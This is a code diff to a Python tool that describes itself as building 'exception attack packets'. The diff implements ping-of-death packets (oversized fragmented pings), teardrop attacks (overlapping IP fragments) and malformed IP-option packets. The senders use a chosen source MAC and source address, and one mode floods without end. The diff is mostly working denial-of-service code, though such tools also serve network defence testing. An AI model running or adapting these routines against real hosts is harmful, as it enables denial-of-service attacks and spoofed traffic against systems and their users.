@@ -6,9 +6,22 @@
 # @Time     : 2022/9/28 14:28
 
 """
--------------------- Function --------------------
-Desc: 
----------------------- End -----------------------
+<An exception packet construction tool that can construct 11 types of exception attack packets.>
+Copyright (C) <2022/10/21> <Taknife>
+
+This program is free software; you can redistribute it and/or modify
+it under the terms of the GNU General Public License as published by
+the Free Software Foundation; either version 2 of the License, or
+(at your option) any later version.
+
+This program is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+GNU General Public License for more details.
+
+You should have received a copy of the GNU General Public License along
+with this program; if not, write to the Free Software Foundation, Inc.,
+51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 """
 
 
@@ -44,7 +57,28 @@ def src_choice():
 
 class SwitchCase():
     def ping_of_death(self):
-        pass
+        network_card = iface(module.int)
+        smac = smac_choice()
+        src = src_choice()
+        data = ""
+        frag = 0
+        for i in range(1480):
+            data += "P"
+        pkt = ipv4_ping_of_death(smac=smac, frag=0, src=src, dst=module.dst, data=data)
+        pkt.show()
+        for j in range(module.num):
+            for k in range(0, 66600, len(data)):
+                print(k)
+                frag = int(k / 8)
+                pkt = ipv4_ping_of_death(smac=smac, frag=frag, src=src, dst=module.dst, data=data)
+                ping_of_death_send(pkt=pkt, tim=module.time, net=network_card)
+                tag = k
+        frag += len(data)
+        print(frag)
+        pkt = ipv4_ping_of_death_end(smac=smac, frag=frag, src=src, dst=module.dst, data=data)
+        ping_of_death_send(pkt=pkt, tim=module.time, net=network_card)
+
+
 
     def land_base(self):
         network_card = iface(module.int)
@@ -59,7 +93,34 @@ class SwitchCase():
 
 
     def tear_drop(self):
-        pass
+        network_card = iface(module.int)
+        smac = smac_choice()
+        src = src_choice()
+        data = ""
+        frag = 0
+        for i in range(module.data):
+            data += 'A'
+        if not module.frag:
+            frag = int(len(data) / 8 - 1)
+        else:
+            frag = int(module.frag / 8)
+        if not module.proto:
+            print("---------- Package 1 ----------")
+            pkt1 = ipv4_tear_drop(smac=smac, src=src, frag=0, dst=module.dst, data=data)
+            pkt1.show()
+            print("---------- Package 2 ----------")
+            pkt2 = ipv4_tear_drop(smac=smac, src=src, frag=frag, dst=module.dst, data=data)
+            pkt2.show()
+            tear_drop_send(pkt1=pkt1, pkt2=pkt2, num=module.num, net=network_card, tim=module.time)
+        else:
+            print("---------- Package 1 ----------")
+            pkt1 = ipv4_tear_drop(smac=smac, src=src, frag=0, dst=module.dst, data=data, proto=module.proto)
+            pkt1.show()
+            print("---------- Package 2 ----------")
+            pkt2 = ipv4_tear_drop(smac=smac, src=src, frag=frag, dst=module.dst, data=data, proto=module.proto)
+            pkt2.show()
+            tear_drop_send(pkt1=pkt1, pkt2=pkt2, num=module.num, net=network_card, tim=module.time)
+
 
     def tcp_flag(self):
         network_card = iface(module.int)
@@ -112,7 +173,16 @@ class SwitchCase():
 
 
     def ip_option(self):
-        pass
+        network_card = iface(module.int)
+        smac = smac_choice()
+        src = src_choice()
+        pkt = ipv4_ip_option(smac=smac, src=src, dst=module.dst)
+        pkt.show()
+
+        if module.num:
+            loop_packets(pkt=pkt, num=module.num, tim=module.time, net=network_card)
+        else:
+            infinite_packets(pkt=pkt, tim=module.time, net=network_card)
 
     def ip_spoof(self):
         pass
